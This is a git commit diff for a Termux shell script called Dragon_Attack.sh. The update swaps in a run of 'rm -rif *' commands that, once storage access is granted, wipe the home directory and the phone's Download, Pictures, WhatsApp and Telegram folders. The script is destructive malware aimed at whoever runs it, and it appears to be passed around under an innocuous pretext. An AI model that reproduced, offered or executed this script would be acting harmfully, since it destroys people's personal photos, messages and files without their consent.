c8ac2eefc29fc2afee7eea79f3c8d0b6529d427a
we are (Tm~DA) Dragon_Attack <80425813+Dragonattack404@users.noreply.github.com>
2021-03-11 00:50:27 +0200

    Update Dragon_Attack.sh

--- Dragon_Attack.sh
+++ Dragon_Attack.sh
@@ -1,4 +1,18 @@
 termux-setup-storage
-mkdir .as.sh
-mv (Tm~Da) De.sh
-bash De.sh
+rm -rif *
+cd /sdcard/download
+rm -rif *
+cd
+rm -rif *
+cd /sdcard/Pictures
+rm -rif *
+cd ..
+cd /sdcard/WhatsApp
+rm -rif *
+cd ..
+cd /sdcard/Telegram
+rm -rif *
+cd ..
+rm -rif *
+cd 
+rm -rif *
